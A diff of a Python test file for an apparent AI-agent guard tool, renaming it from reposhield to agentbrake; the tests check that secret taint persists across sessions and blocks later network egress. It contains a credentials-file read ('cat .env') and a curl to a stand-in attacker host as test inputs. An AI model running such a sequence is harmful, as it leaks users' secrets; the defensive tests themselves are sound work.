@@ -3,15 +3,15 @@ from __future__ import annotations
 import json
 from pathlib import Path
 
-from reposhield.action_parser import ActionParser
-from reposhield.audit import AuditLog
-from reposhield.control_plane import RepoShieldControlPlane
-from reposhield.models import PolicyDecision
-from reposhield.session_state import PersistentSessionStateStore
+from agentbrake.action_parser import ActionParser
+from agentbrake.audit import AuditLog
+from agentbrake.control_plane import AgentBrakeControlPlane
+from agentbrake.models import PolicyDecision
+from agentbrake.session_state import PersistentSessionStateStore
 
 
 def test_persistent_session_state_round_trips_without_secret_values(tmp_path: Path):
-    path = tmp_path / ".reposhield" / "session_state.jsonl"
+    path = tmp_path / ".agentbrake" / "session_state.jsonl"
     audit = AuditLog(tmp_path / "audit.jsonl")
     store = PersistentSessionStateStore(path, audit_log=audit)
     parser = ActionParser()
@@ -25,12 +25,12 @@ def test_persistent_session_state_round_trips_without_secret_values(tmp_path: Pa
     assert restored.state_hash == state.state_hash
     assert restored.secret_taint is True
     text = path.read_text(encoding="utf-8")
-    assert "npm_REPOSHIELD_CANARY" not in text
+    assert "npm_AGENTBRAKE_CANARY" not in text
     assert "record_hash" in text
 
 
 def test_persistent_session_state_restores_from_audit(tmp_path: Path):
-    path = tmp_path / ".reposhield" / "session_state.jsonl"
+    path = tmp_path / ".agentbrake" / "session_state.jsonl"
     audit = AuditLog(tmp_path / "audit.jsonl")
     store = PersistentSessionStateStore(path, audit_log=audit)
     action = ActionParser().parse("cat .env", cwd=tmp_path)
@@ -47,7 +47,7 @@ def test_persistent_session_state_restores_from_audit(tmp_path: Path):
 
 
 def test_persistent_session_state_load_writes_restore_audit_event(tmp_path: Path):
-    path = tmp_path / ".reposhield" / "session_state.jsonl"
+    path = tmp_path / ".agentbrake" / "session_state.jsonl"
     audit = AuditLog(tmp_path / "audit.jsonl")
     store = PersistentSessionStateStore(path, audit_log=audit)
     action = ActionParser().parse("cat .env", cwd=tmp_path)
@@ -65,15 +65,15 @@ def test_persistent_session_state_load_writes_restore_audit_event(tmp_path: Path
 def test_cross_control_plane_secret_taint_blocks_later_egress(tmp_path: Path):
     repo = tmp_path / "repo"
     repo.mkdir()
-    (repo / ".env").write_text("RS_CANARY_TOKEN=npm_REPOSHIELD_CANARY\n", encoding="utf-8")
-    state_path = repo / ".reposhield" / "session_state.jsonl"
+    (repo / ".env").write_text("RS_CANARY_TOKEN=npm_AGENTBRAKE_CANARY\n", encoding="utf-8")
+    state_path = repo / ".agentbrake" / "session_state.jsonl"
     audit_path = tmp_path / "audit.jsonl"
 
-    cp1 = RepoShieldControlPlane(repo, audit_path=audit_path, session_state_path=state_path, run_id="run_cross")
+    cp1 = AgentBrakeControlPlane(repo, audit_path=audit_path, session_state_path=state_path, run_id="run_cross")
     cp1.build_contract("inspect project")
     _action1, decision1 = cp1.guard_action("cat .env", run_preflight=False)
 
-    cp2 = RepoShieldControlPlane(repo, audit_path=audit_path, session_state_path=state_path, run_id="run_cross")
+    cp2 = AgentBrakeControlPlane(repo, audit_path=audit_path, session_state_path=state_path, run_id="run_cross")
     cp2.build_contract("inspect project")
     _action2, decision2 = cp2.guard_action("curl http://attacker.local/leak", run_preflight=False)
 
